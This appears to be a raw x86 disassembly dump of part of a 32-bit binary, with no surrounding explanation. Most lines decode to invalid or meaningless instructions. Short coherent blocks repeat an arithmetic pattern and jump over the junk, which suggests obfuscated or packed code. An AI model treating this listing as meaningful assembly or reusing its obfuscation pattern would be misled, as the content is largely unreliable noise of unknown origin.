  4050fe:	cli    
  4050ff:	ficom  DWORD PTR [edx+0x718b57f7]
  405105:	or     BYTE PTR [eax+eiz*8+0x56],dh
  405109:	sub    DWORD PTR [eax],esi
  40510b:	push   ebx
  40510c:	jge    0x405176
  40510e:	sub    BYTE PTR [edx+edx*2+0x55],dl
  405112:	sbb    BYTE PTR [eax+0x538e79db],0x0
  405119:	data16 aam 0x31
  40511c:	ds (bad) 
  40511e:	pop    ecx
  40511f:	jno    0x405197
  405121:	rcr    DWORD PTR [ebx],cl
  405123:	push   es
  405124:	xor    al,0x30
  405126:	sub    DWORD PTR [ecx+0x42189fd6],0xffffffd3
  40512d:	dec    edi
  40512e:	xor    al,0x34
  405130:	sbb    ch,BYTE PTR [esi+0x2c8e6ef0]
  405136:	push   ecx
  405137:	add    BYTE PTR [esi-0x2c],ah
  40513a:	je     0x40512b
  40513c:	sbb    edi,DWORD PTR [ecx+0x1d]
  40513f:	shl    BYTE PTR [ebx-0x4962376],cl
  405145:	jg     0x405101
  405147:	push   ebx
  405148:	cmp    dh,BYTE PTR [edx+0x7a434cbd]
  40514e:	fmul   DWORD PTR [edi]
  405150:	scas   eax,DWORD PTR es:[edi]
  405151:	sti    
  405152:	mov    ebx,DWORD PTR [ebp-0x18]
  405155:	xor    ebx,eax
  405157:	sub    edx,ecx
  405159:	lea    edi,[edi+ebx*1+0x32729b]
  405160:	jmp    0x405463
  405165:	pusha  
  405166:	das    
  405167:	sti    
  405168:	pop    eax
  405169:	push   ecx
  40516a:	push   0x65ca3761
  40516f:	out    0x76,eax
  405171:	jmp    0x405150
  405173:	js     0x40510f
  405175:	imul   BYTE PTR [esi+edi*2]
  405178:	jle    0x4051d2
  40517a:	jl     0x4051fa
  40517c:	jle    0x4050fe
  40517e:	mov    BYTE PTR [edx],ch
  405180:	add    bh,BYTE PTR [si-0x324e]
  405185:	pop    ebp
  405186:	rcl    BYTE PTR [edx-0x5c],1
  405189:	(bad)  [esi-0x7414fef9]
  40518f:	or     bh,BYTE PTR [edi+0x5a]
  405192:	in     eax,dx
  405193:	xor    ebx,ebx
  405195:	out    dx,al
  405196:	sub    al,0x42
  405198:	xchg   edi,eax
  405199:	icebp  
  40519a:	gs add al,0xe3
  40519d:	or     esp,esp
  40519f:	xchg   ecx,eax
  4051a0:	test   eax,0xffc9e6dc
  4051a5:	jecxz  0x405201
  4051a7:	int3   
  4051a8:	mov    eax,0xeef962cf
  4051ad:	dec    ebp
  4051ae:	xchg   ebx,eax
  4051af:	addr16 dec ecx
  4051b1:	gs mov ch,0x6f
  4051b4:	popf   
  4051b5:	push   ds
  4051b6:	not    DWORD PTR [edx+0x74]
  4051b9:	nop    DWORD PTR [eax+0x1afb131]
  4051c0:	outs   dx,BYTE PTR ds:[esi]
  4051c1:	data16 daa 
  4051c3:	inc    eax
  4051c4:	push   eax
  4051c5:	fucomp st(7)
  4051c7:	sub    eax,DWORD PTR ds:0x863863d6
  4051cd:	jne    0x4051e5
  4051cf:	jg     0x405163
  4051d1:	pop    edx
  4051d2:	mov    eax,0xf57ee97e
  4051d7:	mov    al,0x3e
  4051d9:	ins    BYTE PTR es:[edi],dx
  4051da:	bsf    edx,ebp
  4051dd:	dec    eax
  4051de:	lods   eax,DWORD PTR ds:[esi]
  4051df:	add    bl,al
  4051e1:	inc    eax
  4051e2:	outs   dx,DWORD PTR ds:[esi]
  4051e3:	add    al,0xc5
  4051e5:	xor    BYTE PTR [esi-0x6c0d706],0xa5
  4051ec:	fldenv [edx+0x1f]
  4051ef:	sub    edx,DWORD PTR cs:[eax-0x5a]
  4051f3:	bnd jnp 0x405221
  4051f6:	jno    0x405197
  4051f8:	aaa    
  4051f9:	jp     0x4051fc
  4051fb:	lods   eax,DWORD PTR ds:[esi]
  4051fc:	cmp    esi,DWORD PTR [eax-0x52]
  4051ff:	fs (bad) 
  405201:	adc    DWORD PTR [eax-0x3a],esp
  405204:	loope  0x4051f2
  405206:	or     BYTE PTR [esi],ah
  405208:	and    ebx,DWORD PTR [esi+0x1c918bc]
  40520e:	dec    ecx
  40520f:	mul    BYTE PTR [esi]
  405211:	push   es
  405212:	test   DWORD PTR [esi+0x5f1a295a],0x6874e767
  40521c:	xor    cl,BYTE PTR [ebx*2+0x19b4e851]
  405223:	int    0xe4
  405225:	add    BYTE PTR [eax],dl
  405227:	push   es
  405228:	or     al,0x92
  40522a:	stos   DWORD PTR es:[edi],eax
  40522b:	fcomp  QWORD PTR [edi+0x1c98f2ec]
  405231:	mov    BYTE PTR [ebp+0x17574c19],ah
  405237:	das    
  405238:	adc    eax,ebp
  40523a:	data16 fst DWORD PTR ds:0xd0ba
  405240:	adc    eax,0x496b7345
  405245:	add    cl,BYTE PTR [ebx+0xa9333b3]
  40524b:	add    eax,0xb32855c7
  405251:	inc    ebx
  405252:	mov    esp,0x75048032
  405257:	jb     0x405253
  405259:	or     BYTE PTR [ebp-0x8e571a8],bh
  40525f:	lods   eax,DWORD PTR ds:[esi]
  405260:	xor    BYTE PTR [ebx+0x20],ch
  405263:	sbb    DWORD PTR [ebx],esi
  405265:	push   eax
  405266:	inc    ecx
  405267:	xlat   BYTE PTR ds:[ebx]
  405268:	js     0x4051ea
  40526a:	mov    al,0xa5
  40526c:	mov    dh,0xb8
  40526e:	lods   al,BYTE PTR ds:[esi]
  40526f:	mov    bh,0x61
  405271:	lahf   
  405272:	cmp    esi,DWORD PTR [ecx+0x6ce1c77b]
  405278:	xor    ecx,DWORD PTR [edi]
  40527a:	and    esp,ebx
  40527c:	ficomp WORD PTR [ecx+0xc]
  40527f:	call   0x6fca:0xc4d3d0ca
  405286:	sar    DWORD PTR [ecx],cl
  405288:	mov    ebx,0xc93492f8
  40528d:	pop    eax
  40528e:	dec    ebp
  40528f:	inc    eax
  405290:	arpl   WORD PTR [ebx-0x1e],dx
  405293:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  405294:	jmp    0x9d6b:0xc66faa68
  40529b:	and    ebp,esp
  40529d:	sbb    DWORD PTR [ebx],ebx
  40529f:	fistp  QWORD PTR [eax]
  4052a1:	jno    0x40529b
  4052a3:	ja     0x4052f3
  4052a5:	mov    cl,0x78
  4052a7:	out    0xb6,eax
  4052a9:	fsub   DWORD PTR [eax]
  4052ab:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4052ac:	jge    0x4052d4
  4052ae:	rcr    DWORD PTR [ecx-0x28bb26ba],1
  4052b4:	xchg   edi,eax
  4052b5:	xor    al,0x61
  4052b7:	or     al,BYTE PTR [esi+0x5c36d4a7]
  4052bd:	mov    esp,0x6b176601
  4052c2:	mov    edx,0x5df2c56f
  4052c7:	pop    ds
  4052c8:	test   al,0xe5
  4052ca:	fnstenv [edi+edx*2-0x27c77069]
  4052d1:	jno    0x4052a5
  4052d3:	sahf   
  4052d4:	mov    ds:0x829a2b9a,al
  4052d9:	outs   dx,BYTE PTR ds:[esi]
  4052da:	sbb    al,0x72
  4052dc:	xchg   DWORD PTR [ebx+0x10],eax
  4052df:	(bad)  
  4052e0:	cld    
  4052e1:	dec    ecx
  4052e2:	sub    BYTE PTR [edx-0x31],al
  4052e5:	or     DWORD PTR [ebp-0x17],ecx
  4052e8:	dec    ecx
  4052e9:	dec    edi
  4052ea:	(bad)  
  4052eb:	pop    esp
  4052ec:	inc    ebp
  4052ed:	aam    0x95
  4052ef:	or     al,0xf2
  4052f1:	cmp    esp,esi
  4052f3:	bound  esi,QWORD PTR [ebx-0x77127cff]
  4052f9:	pop    ebp
  4052fa:	xor    ecx,esi
  4052fc:	inc    ecx
  4052fd:	dec    esp
  4052fe:	cli    
  4052ff:	mov    ebx,0x156fd1c7
  405304:	mov    ecx,0xf4f931dc
  405309:	scas   eax,DWORD PTR es:[edi]
  40530a:	cmp    al,BYTE PTR es:[ebp-0x1ae81e9c]
  405311:	das    
  405312:	inc    edx
  405313:	xchg   DWORD PTR [ecx+0x4f364fb],edx
  405319:	adc    ch,BYTE PTR [ebx+0x6a39adde]
  40531f:	and    dl,BYTE PTR [esi]
  405321:	mov    WORD PTR [eax+0x30],gs
  405324:	xchg   edi,eax
  405325:	leave  
  405326:	das    
  405327:	push   ebp
  405328:	test   al,0x3
  40532a:	xor    BYTE PTR [edx+edx*4],dl
  40532d:	(bad)  
  40532e:	pop    edi
  40532f:	or     DWORD PTR [esi],edi
  405331:	jnp    0x4053a8
  405333:	or     DWORD PTR [eax],edx
  405335:	fist   DWORD PTR [edi]
  405337:	imul   esp,edi,0x61
  40533a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40533b:	push   0xffffff9e
  40533d:	in     eax,0x16
  40533f:	aad    0x13
  405341:	mov    ah,0x3c
  405343:	scas   eax,DWORD PTR es:[edi]
  405344:	outs   dx,BYTE PTR ds:[esi]
  405345:	inc    DWORD PTR [edi]
  405347:	fild   WORD PTR [edx+0x78]
  40534a:	frstor [edx-0xd]
  40534d:	or     eax,0x226a9f73
  405352:	and    ecx,DWORD PTR [ecx]
  405354:	xor    eax,0x61bd64bf
  405359:	adc    ecx,edx
  40535b:	test   edx,edx
  40535d:	shl    eax,0x9b
  405360:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405361:	sbb    al,0x72
  405363:	mov    ds:0x3578646,eax
  405368:	mov    ds:0xa02b1051,al
  40536d:	mov    bh,0xdb
  40536f:	pop    es
  405370:	sub    BYTE PTR [eax+0x46],0xf0
  405374:	adc    bl,bl
  405376:	test   al,0x80
  405378:	and    esp,DWORD PTR [esi]
  40537a:	lock mov WORD PTR [eax+eiz*1-0x47],?
  40537f:	dec    ecx
  405380:	hlt    
  405381:	aaa    
  405382:	xchg   DWORD PTR [esi+0x4ad47d68],edi
  405388:	std    
  405389:	std    
  40538a:	xor    ebx,eax
  40538c:	and    BYTE PTR [edi],0xec
  40538f:	ret    
  405390:	jnp    0x40538e
  405392:	xchg   esp,eax
  405393:	test   bh,bl
  405395:	mov    ebx,0x22215ae7
  40539a:	pop    ss
  40539b:	inc    esp
  40539c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40539d:	xlat   BYTE PTR ds:[ebx]
  40539e:	stos   DWORD PTR es:[edi],eax
  40539f:	sbb    esi,DWORD PTR [ecx+0x73]
  4053a2:	add    al,0xd3
  4053a4:	jb     0x4053b3
  4053a6:	xchg   edi,eax
  4053a7:	hlt    
  4053a8:	jae    0x405413
  4053aa:	into   
  4053ab:	mov    cl,dl
  4053ad:	in     eax,0x23
  4053af:	ins    BYTE PTR es:[edi],dx
  4053b0:	ror    esp,0x81
  4053b3:	add    ebp,esi
  4053b5:	pop    ds
  4053b6:	pop    ebx
  4053b7:	(bad)  
  4053b8:	sub    esi,esp
  4053ba:	cmp    eax,0x235369cc
  4053bf:	addr16 xchg ecx,eax
  4053c1:	dec    ecx
  4053c2:	sub    ch,ch
  4053c4:	mov    ebp,0x3ec26893
  4053c9:	out    dx,al
  4053ca:	fimul  WORD PTR [eax+0x15767792]
  4053d0:	scas   al,BYTE PTR es:[edi]
  4053d1:	ror    DWORD PTR [esp+edi*8+0x9504929],0x5e
  4053d9:	inc    edi
  4053da:	sahf   
  4053db:	inc    edi
  4053dc:	and    eax,0x3a366b8b
  4053e1:	in     eax,dx
  4053e2:	test   al,0x88
  4053e4:	push   ecx
  4053e5:	out    dx,al
  4053e6:	mov    eax,ds:0xe9d7b955
  4053eb:	sbb    esp,esp
  4053ed:	ret    
  4053ee:	scas   al,BYTE PTR es:[edi]
  4053ef:	jge    0x40545d
  4053f1:	lea    edx,[edi-0x63]
  4053f4:	sbb    DWORD PTR [edx+0x78],ecx
  4053f7:	inc    ebp
  4053f8:	jl     0x4053b8
  4053fa:	stos   DWORD PTR es:[edi],eax
  4053fb:	js     0x40542c
  4053fd:	cmp    eax,0x1b715c33
  405402:	dec    ebp
  405403:	stc    
  405404:	xor    esp,esi
  405406:	cmp    edi,eax
  405408:	(bad)  
  405409:	fiadd  WORD PTR [edx+0x56922fa3]
  40540f:	pop    esi
  405410:	lods   eax,DWORD PTR ds:[esi]
  405411:	inc    eax
  405412:	cmp    bh,BYTE PTR [edx+0x6143bf90]
  405418:	scas   al,BYTE PTR es:[edi]
  405419:	nop
  40541a:	xor    esi,esp
  40541c:	lahf   
  40541d:	test   DWORD PTR [esi-0x6b38cb8],ecx
  405423:	cmp    eax,DWORD PTR [edi+0x600d6789]
  405429:	mov    WORD PTR [edx+0x54],ss
  40542c:	xor    eax,DWORD PTR [ecx]
  40542e:	int3   
  40542f:	int3   
  405430:	adc    cl,BYTE PTR [edx+0x7bc5634c]
  405436:	sti    
  405437:	aam    0x3b
  405439:	jns    0x405486
  40543b:	cmp    ah,BYTE PTR [edi+eax*4]
  40543e:	and    esp,DWORD PTR [esi+0x1f]
  405441:	push   ds
  405442:	jg     0x4053fc
  405444:	jno    0x405491
  405446:	retf   
  405447:	cmp    bh,bh
  405449:	adc    ebx,edi
  40544b:	aam    0x21
  40544d:	xor    eax,0x40458126
  405452:	add    DWORD PTR [ecx-0x1e73d8aa],edx
  405458:	test   eax,0xa4f37873
  40545d:	and    al,0xcd
  40545f:	add    edx,edx
  405461:	xor    al,0xca
  405463:	cmp    edi,edx
  405465:	jbe    0x404ac0
  40546b:	mov    edx,DWORD PTR [ebp-0xc]
  40546e:	mov    edi,DWORD PTR [ebp-0x24]
  405471:	jmp    0x405774
  405476:	outs   dx,DWORD PTR ds:[esi]
  405477:	fisttp QWORD PTR [esi+0x6f6d8cef]
  40547d:	pop    ebp
  40547e:	fmul   QWORD PTR [edi+0x5660fbb8]
  405484:	js     0x405424
  405486:	shr    BYTE PTR [ebx],1
  405488:	jle    0x405508
  40548a:	pop    eax
  40548b:	jl     0x40550b
  40548d:	jle    0x40550a
  40548f:	mov    ch,bl
  405491:	cmc    
  405492:	mov    eax,0xa1d13965
  405497:	fidiv  WORD PTR [edi+0x4569c135]
  40549d:	mov    ch,0x20
  40549f:	pop    ebx
  4054a0:	jnp    0x405471
  4054a2:	sub    DWORD PTR [ecx+0x5bf3c0aa],eax
  4054a8:	xchg   edi,eax
  4054a9:	or     DWORD PTR [edi+0x4d4a405b],esp
  4054af:	out    dx,al
  4054b0:	and    al,0x94
  4054b2:	mov    edx,DWORD PTR [edi-0x31a43113]
  4054b8:	pop    ebp
  4054b9:	cmp    BYTE PTR [ebp+0x8],dh
  4054bc:	dec    ebx
  4054bd:	nop
  4054be:	jmp    0x4054f2
  4054c0:	fucom  st(4)
  4054c2:	fcom   QWORD PTR [ebx-0x5a78e11c]
  4054c8:	xchg   ebp,eax
  4054c9:	lahf   
  4054ca:	outs   dx,DWORD PTR ds:[esi]
  4054cb:	jle    0x405460
  4054cd:	adc    eax,0x24125b1d
  4054d2:	hlt    
  4054d3:	fimul  WORD PTR [eax-0x40296371]
  4054d9:	pop    esp
  4054da:	test   DWORD PTR [ebx+0x206ddab5],edx
  4054e0:	or     al,0xb6
  4054e2:	shl    esp,1
  4054e4:	mov    ch,0x55
  4054e6:	jmp    0x4054e9
  4054e8:	xor    DWORD PTR [edi+ebx*1],0x32f4facb
  4054ef:	mov    edx,0xa667c5ef
  4054f4:	inc    edi
  4054f5:	and    BYTE PTR [eax+0x39c6933e],bh
  4054fb:	cli    
  4054fc:	stc    
  4054fd:	data16 test BYTE PTR [edx],cl
  405500:	add    esp,DWORD PTR [edx+0x2e4af019]
  405506:	popf   
  405507:	inc    ebx
  405508:	push   0xa22f215
  40550d:	sti    
  40550e:	stos   BYTE PTR es:[edi],al
  40550f:	pop    es
  405510:	out    dx,al
  405511:	jmp    0x405502
  405513:	mov    esp,0xd4859793
  405518:	mov    ecx,0xfaae4c1b
  40551d:	ins    BYTE PTR es:[edi],dx
  40551e:	(bad)  
  40551f:	push   ds
  405520:	adc    BYTE PTR [ecx+eiz*2+0x34],0x73
  405525:	mov    esp,0xa05f48da
  40552a:	dec    esp
  40552b:	mov    esp,0xaeaf27a3
  405530:	in     eax,dx
  405531:	mov    ds:0x77309547,al
  405536:	mov    bl,0xc
  405538:	jp     0x405580
  40553a:	jl     0x4054c5
  40553c:	adc    al,0x1e
  40553e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40553f:	out    0x8a,al
  405541:	nop
  405542:	sbb    ebp,esp
  405544:	jle    0x4054dd
  405546:	xchg   ebx,eax
  405547:	mov    dh,0xd4
  405549:	sbb    al,0x28
  40554b:	js     0x40556e
  40554d:	adc    BYTE PTR es:[ecx],ah
  405550:	mov    ah,0xcf
  405552:	xchg   ebx,eax
  405553:	repnz adc ebx,DWORD PTR [ecx+0x4930852f]
  40555a:	hlt    
  40555b:	mov    ch,0xf8
  40555d:	nop
  40555e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40555f:	cmp    BYTE PTR [bx-0x3bea],bh
  405564:	lds    edi,FWORD PTR [edx-0x49]
  405567:	out    dx,al
  405568:	mov    al,ds:0x36737eca
  40556d:	fisttp WORD PTR [ecx]
  40556f:	mov    DWORD PTR [ebx+0x2e0b021e],ebx
  405575:	and    BYTE PTR [ecx+0x37],al
  405578:	leave  
  405579:	lock loope 0x405583
  40557c:	sbb    esi,esi
  40557e:	test   eax,0xc71aea7c
  405583:	mov    ds:0x17f8a1db,eax
  405588:	add    ah,ch
  40558a:	pop    ecx
  40558b:	and    BYTE PTR [esi],bh
  40558d:	pop    esi
  40558e:	xor    dl,cl
  405590:	dec    ecx
  405591:	pusha  
  405592:	xor    al,0xa5
  405594:	(bad)  
  405595:	xchg   ebp,eax
  405596:	mov    gs,WORD PTR ds:0x224c7c99
  40559c:	mov    al,0xe1
  40559e:	mov    ds:0xbcc59e4c,eax
  4055a3:	mov    ds:0x7ca8f970,eax
  4055a8:	sti    
  4055a9:	out    0x74,al
  4055ab:	aad    0x2a
  4055ad:	div    DWORD PTR [eax+0x19d0c4d8]
  4055b3:	(bad)  
  4055b4:	in     al,0x6e
  4055b6:	add    bl,bl
  4055b8:	lods   al,BYTE PTR ds:[esi]
  4055b9:	jo     0x40559a
  4055bb:	add    ebx,edi
  4055bd:	ret    
  4055be:	pop    ebp
  4055bf:	mov    ebp,0x1d9c1c12
  4055c4:	js     0x40557c
  4055c6:	inc    esp
  4055c7:	inc    esi
  4055c8:	aas    
  4055c9:	cmp    BYTE PTR [ebp+0x5b],cl
  4055cc:	or     eax,DWORD PTR [edx]
  4055ce:	sub    eax,0x948935ba
  4055d3:	das    
  4055d4:	mov    cl,0xbb
  4055d6:	ret    0x64e1
  4055d9:	loopne 0x40555b
  4055db:	jecxz  0x405647
  4055dd:	jg     0x405652
  4055df:	bound  esi,QWORD PTR [edi]
  4055e1:	xor    DWORD PTR [esi-0x14],ebp
  4055e4:	mov    ds:0x37f1b3f0,eax
  4055e9:	neg    DWORD PTR [eax-0x6507a269]
  4055ef:	inc    ebx
  4055f0:	jmp    0x405589
  4055f2:	out    dx,eax
  4055f3:	inc    eax
  4055f4:	ins    DWORD PTR es:[edi],dx
  4055f5:	cmp    al,0x10
  4055f7:	inc    edi
  4055f8:	lds    eax,FWORD PTR [ebx-0x2dc98129]
  4055fe:	add    al,0x68
  405600:	and    al,0x12
  405602:	pop    eax
  405603:	sbb    edi,DWORD PTR [ebp-0x387987e7]
  405609:	shr    ecx,cl
  40560b:	les    ecx,FWORD PTR [edi+0x59]
  40560e:	div    esp
  405610:	dec    eax
  405611:	cli    
  405612:	mov    edi,0xda441f07
  405617:	xchg   edi,eax
  405618:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  405619:	jns    0x4055ed
  40561b:	loope  0x405677
  40561d:	jb     0x4055df
  40561f:	or     DWORD PTR [edx-0x2],esi
  405622:	sub    edx,DWORD PTR [ecx-0x32b3f304]
  405628:	neg    DWORD PTR [edi+0x4c]
  40562b:	stos   DWORD PTR es:[edi],eax
  40562c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40562d:	retf   0x3920
  405630:	test   esi,0x49d73bd1
  405636:	mov    edx,0xbab56700
  40563b:	add    al,0x68
  40563d:	mov    ebx,0x37dc99c5
  405642:	pop    es
  405643:	mov    eax,ds:0x1bb525f8
  405648:	mov    edx,0x1c806841
  40564d:	in     eax,0x93
  40564f:	mov    al,0xfa
  405651:	ja     0x405614
  405653:	push   cs
  405654:	add    edi,DWORD PTR [ebp+0x1759f7ac]
  40565a:	jmp    0xca28a484
  40565f:	pop    ds
  405660:	push   eax
  405661:	lds    ebx,FWORD PTR [edi]
  405663:	jns    0x40561f
  405665:	out    dx,eax
  405666:	enter  0xeb19,0x99
  40566a:	push   ecx
  40566b:	aaa    
  40566c:	clc    
  40566d:	cmp    BYTE PTR [eax-0x4e759e43],al
  405673:	test   eax,0x30f4cc40
  405678:	(bad)  
  405679:	aam    0x17
  40567b:	mov    dh,0x5e
  40567d:	rcl    DWORD PTR [edx+esi*8],0xd7
  405681:	push   esp
  405682:	mov    eax,ds:0xea21ffe5
  405687:	stc    
  405688:	mov    ah,0x48
  40568a:	jge    0x40566a
  40568c:	mov    ebp,0xbf775d88
  405691:	xchg   edi,eax
  405692:	sbb    edi,esi
  405694:	and    edx,ebx
  405696:	xchg   ebp,eax
  405697:	int    0xfa
  405699:	or     ebx,esi
  40569b:	push   ss
  40569c:	aam    0x1b
  40569e:	mov    esp,ebx
  4056a0:	mov    cl,BYTE PTR [ecx+edi*1+0x27]
  4056a4:	cli    
  4056a5:	fst    DWORD PTR [ecx+0x6d9fc362]
  4056ab:	mov    dl,0xf3
  4056ad:	int    0xaf
  4056af:	ret    0xe258
  4056b2:	dec    ecx
  4056b3:	aas    
  4056b4:	xchg   ebx,eax
  4056b5:	sar    DWORD PTR [edx+0x45],cl
  4056b8:	std    
  4056b9:	push   esi
  4056ba:	pop    esi
  4056bb:	mov    DWORD PTR [ebp+eiz*8+0x67364b13],0x1e1800f4
  4056c6:	mov    ebp,0x42f96319
  4056cb:	lock shl dh,0x4f
  4056cf:	paddw  mm0,mm6
  4056d2:	rcl    DWORD PTR [eax-0x6],1
  4056d5:	adc    al,0xf7
  4056d7:	in     eax,0x1e
  4056d9:	aas    
  4056da:	out    dx,eax
  4056db:	xor    BYTE PTR [ebx],dh
  4056dd:	and    DWORD PTR [eax+0xad97bbb],edx
  4056e3:	aas    
  4056e4:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4056e5:	add    bh,cl
  4056e7:	cld    
  4056e8:	mov    ebp,ebp
  4056ea:	les    edi,FWORD PTR [ecx]
  4056ec:	daa    
  4056ed:	jg     0x4056a2
  4056ef:	inc    edi
  4056f0:	push   es
  4056f1:	cmp    DWORD PTR [edi-0x23291832],0x54
  4056f8:	xchg   esi,eax
  4056f9:	shr    bl,1
  4056fb:	mov    cl,0x1b
  4056fd:	hlt    
  4056fe:	inc    ebx
  4056ff:	xor    DWORD PTR [edi+0xcc453b8],esp
  405705:	mov    edx,0xc09a557b
  40570a:	js     0x405767
  40570c:	mov    edx,DWORD PTR [esi+0x6b0d63ad]
  405712:	inc    esp
  405713:	and    ch,dh
  405715:	xchg   edi,eax
  405716:	mov    bl,bl
  405718:	adc    eax,0x218e1411
  40571d:	js     0x4056be
  40571f:	icebp  
  405720:	(bad)  
  405721:	call   0xe1ae27d
  405726:	or     al,0x9b
  405728:	das    
  405729:	and    DWORD PTR [ecx-0x28],esp
  40572c:	or     BYTE PTR [edi],bl
  40572e:	popa   
  40572f:	outs   dx,BYTE PTR es:[esi]
  405731:	in     al,dx
  405732:	arpl   WORD PTR [edx],sp
  405734:	dec    edi
  405735:	mov    bl,0x6d
  405737:	xor    eax,0x62c27866
  40573c:	add    esi,DWORD PTR [ebx*4-0x2eb86e5]
  405743:	cld    
  405744:	jno    0x40572d
  405746:	xor    eax,0xa4935668
  40574b:	sbb    DWORD PTR [eax+0x419f62ee],eax
  405751:	out    0x13,al
  405753:	ins    DWORD PTR es:[edi],dx
  405754:	cmp    DWORD PTR [ecx],eax
  405756:	mov    bh,al
  405758:	rcr    ebp,cl
  40575a:	(bad)  
  40575c:	sub    dl,BYTE PTR [ebp-0x1df61346]
  405762:	xlat   BYTE PTR ds:[ebx]
  405763:	in     eax,0x3a
  405765:	(bad)  
  405766:	pop    ebx
  405767:	outs   dx,BYTE PTR ds:[esi]
  405768:	int3   
  405769:	dec    ebx
  40576a:	(bad)  
  40576b:	call   0x23f8217
  405770:	mov    cs,edx
  405772:	inc    ebx
  405773:	mov    eax,0xd103d033
  405778:	imul   edx,edi
  40577b:	mov    edi,DWORD PTR [ebp-0x18]
  40577e:	xor    edi,eax
  405780:	add    edx,edi
  405782:	mov    edi,DWORD PTR [ebp-0x8]
  405785:	lea    edx,[edx+edi*1+0x32729b]
  40578c:	mov    DWORD PTR [ebp-0x8],edx
  40578f:	mov    edx,DWORD PTR [ebp-0x20]
  405792:	xor    edx,eax
  405794:	mov    edi,0xffcd8d65
  405799:	sub    edi,edx
  40579b:	add    edi,DWORD PTR [ebp-0x10]
  40579e:	mov    edx,DWORD PTR [ebp-0x20]
  4057a1:	mov    ebx,DWORD PTR [ebp-0x8]
  4057a4:	xor    edx,eax
  4057a6:	add    edx,ecx
  4057a8:	imul   edx,ebx
  4057ab:	cmp    edx,edi
  4057ad:	jbe    0x4038ea
  4057b3:	pop    ebx
  4057b4:	pop    edi
  4057b5:	leave  
  4057b6:	ret    0x8
  4057b9:	push   ebp
  4057ba:	mov    ebp,esp
  4057bc:	push   ecx
  4057bd:	mov    ecx,DWORD PTR [ebp+0x8]
  4057c0:	and    eax,DWORD PTR ds:0x43371b
  4057c6:	mov    eax,0x7510854
  4057cb:	xor    DWORD PTR ds:0x433623,0x433603
  4057d5:	xor    ecx,eax
  4057d7:	not    DWORD PTR ds:0x43365f
  4057dd:	add    ecx,0x32729b
  4057e3:	jmp    0x405b32
  4057e8:	scas   eax,DWORD PTR es:[edi]
  4057e9:	inc    BYTE PTR [ebp-0x39]
  4057ec:	jne    0x4057b3
  4057ee:	lods   eax,DWORD PTR ds:[esi]
  4057ef:	jbe    0x4057a1
  4057f1:	loopne 0x4057f0
  4057f3:	mov    al,0xc3
  4057f5:	fwait
  4057f6:	jecxz  0x4057c2
  4057f8:	cmp    dh,BYTE PTR [esi]
  4057fa:	jle    0x40587a
  4057fc:	sub    al,0x7d
  4057fe:	jle    0x40587e
  405800:	inc    edx
  405801:	(bad)  
  405803:	iret   
  405804:	imul   ecx,DWORD PTR [bp+si],0x45381514
  40580b:	inc    edx
  40580c:	bound  ebp,QWORD PTR [esi+esi*1-0x4c]
  405810:	in     eax,dx
  405811:	adc    DWORD PTR gs:[ebx+eax*2],esp
  405815:	push   cs
  405816:	inc    ebx
  405817:	dec    edi
  405818:	rol    dl,1
  40581a:	call   0xbd9782b4
  40581f:	(bad)  
  405820:	and    eax,0x292afba0
  405825:	iret   
  405826:	mov    ebx,0x7d87881a
  40582b:	jmp    0xb479:0x3345bd8d
  405832:	in     eax,dx
  405833:	push   cs
  405834:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  405835:	fcmovb st,st(4)
  405837:	inc    ecx
  405838:	retf   
  405839:	mov    al,ds:0x37c403c5
  40583e:	push   0x3e3749d1
  405843:	arpl   WORD PTR [edx-0x95a7e1b],sp
  405849:	ins    DWORD PTR es:[edi],dx
  40584a:	int3   
  40584b:	retf   0x990a
  40584e:	jmp    0x68fc:0x3dcd7bcc
  405855:	mov    esp,0x17b8ccd0
  40585a:	scas   al,BYTE PTR es:[edi]
  40585b:	addr16 jo 0x4057fe
  40585e:	and    BYTE PTR [edx+0x44],ah
  405861:	jge    0x4057f7
  405863:	popa   
  405864:	dec    esi
  405865:	call   0x3030642d
  40586a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40586b:	fdiv   DWORD PTR [ecx+0x27]
  40586e:	lods   eax,DWORD PTR ds:[esi]
  40586f:	pop    es
  405870:	mov    dh,0x3
  405872:	mov    esi,0x838a8f1f
  405877:	arpl   WORD PTR [ebx],di
  405879:	push   edi
  40587a:	std    
  40587b:	jo     0x4058fc
  40587d:	iret   
  40587e:	icebp  
  40587f:	pop    edi
  405880:	pop    es
  405881:	mov    esp,0xa48f548f
  405886:	inc    esp
  405887:	xor    eax,DWORD PTR [edx+0x67256000]
  40588d:	adc    dh,BYTE PTR ds:0xd76dcf81
  405893:	outs   dx,BYTE PTR ds:[esi]
  405894:	fsubr  QWORD PTR [edi-0x2d6d4a9c]
  40589a:	dec    esi
  40589b:	sub    esp,DWORD PTR [edx-0x6760b826]
  4058a1:	mov    cl,0x86
  4058a3:	lock idiv BYTE PTR [esi-0x3c]
  4058a7:	sbb    bl,bl
  4058a9:	cld    
  4058aa:	xchg   ebx,eax
  4058ab:	out    0x1e,eax
  4058ad:	out    0x50,eax
  4058af:	ja     0x405869
  4058b1:	mov    cl,0x97
  4058b3:	icebp  
  4058b4:	sbb    al,0x70
  4058b6:	sbb    edx,DWORD PTR [ebx]
  4058b8:	scas   eax,DWORD PTR es:[edi]
  4058b9:	cld    
  4058ba:	adc    edx,DWORD PTR [ebx]
  4058bc:	or     DWORD PTR [esi-0x1f1248b9],edi
  4058c2:	adc    dh,BYTE PTR [ebx]
  4058c4:	scas   eax,DWORD PTR es:[edi]
  4058c5:	imul   edx,DWORD PTR fs:0xc1b929f2,0xfffffff0
  4058cd:	leave  
  4058ce:	pusha  
  4058cf:	fmul   QWORD PTR [eax]
  4058d2:	stos   BYTE PTR es:[edi],al
  4058d3:	cmp    esp,esp
  4058d5:	adc    DWORD PTR [ecx],edx
  4058d7:	or     al,0x7b
  4058d9:	in     eax,0x74
  4058db:	push   0xffffffb2
  4058dd:	imul   eax,esi,0xb533a79b
  4058e3:	test   ah,dh
  4058e5:	inc    edx
